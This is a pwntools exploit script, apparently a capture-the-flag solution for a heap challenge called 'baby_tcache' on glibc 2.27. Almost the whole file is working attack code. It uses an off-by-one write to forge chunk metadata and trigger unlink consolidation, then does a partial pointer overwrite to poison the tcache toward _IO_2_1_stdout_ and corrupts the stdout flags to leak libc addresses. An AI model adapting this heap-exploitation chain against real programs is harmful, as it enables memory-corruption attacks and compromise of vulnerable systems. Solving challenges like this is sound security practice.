from pwn import *
context(os="linux", arch="amd64")

DEBUG = 1
LOCAL = 1

def debug_on():
	context.log_level = "debug"

g_fname = "./baby_tcache"
g_elf = ELF(g_fname)
g_libcname =  "/glibc/2.27/64/lib/libc-2.27.so" if LOCAL else "./libc-2.27.so" #/glibc/2.27/debug/x64/lib/libc-2.27.so
g_ld = "/glibc/2.27/64/lib/ld-2.27.so" #"/glibc/2.27/debug/x64/lib/ld-2.27.so"

if (LOCAL):
	g_io = process([g_ld, g_fname], env={"LD_PRELOAD" : g_libcname})
	g_libc = g_elf.libc
else:
	g_io = remote()
	g_libc = ELF(g_libcname)

def getpid():
	if (DEBUG & LOCAL):
		log.info("PID: %d", g_io.proc.pid)
		pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def opt(idx):
	sla("choice: ", str(idx))

def new(size, content):
	opt(1)
	sla("Size:", str(size))
	sa("Data:", content)

def delete(idx):
	opt(2)
	sla("Index:", str(idx))

def pwn():
	new(0x4f8, "aaa\n") # chk_0, not tcache, unsortedbin
	new(0xf8, "bbb\n") # chk_1, tcache
	new(0x4f8, "ccc\n") # chk_2, not tcache, unsortedbin
	new(0xf0, "ddd\n") # chk_3, tcache, prevent ub merges into top chunk.

	delete(0) # free chk_0, put into unsortedbin

	delete(3) # free chk_3, put into tcache
	delete(1) # free chk_1, put into tcache
	new(0xf8, flat(0x600).rjust(0xf8, b'b')) # idx=0, chk_1, get from tcache, off-by-one modify chk_2's prev_inuse
	delete(2) # trigger unlink
	delete(0) # free chk_1, put into tcache

	new(0x4f7, "aaa\n") # idx=0, chk_0
	delete(0) # idx=0, chk_0, write unsortedbin(av) into chk_1's fd and bk.
	getpid()
	new(0x5f7, b'a'*0x4f0 + p64(0x500) + p64(0x101) + b"\x60\x07\xbd") # idx=0, partial write fd, make it points to _IO_2_1_stdout_

	new(0xf0, 'a') # idx=1
	new(0xf0, p64(0xfbad1800) + p64(0)*3 + b'\x00')
	
if ("__main__" == __name__):
	debug_on()
	pwn()
	g_io.interactive()

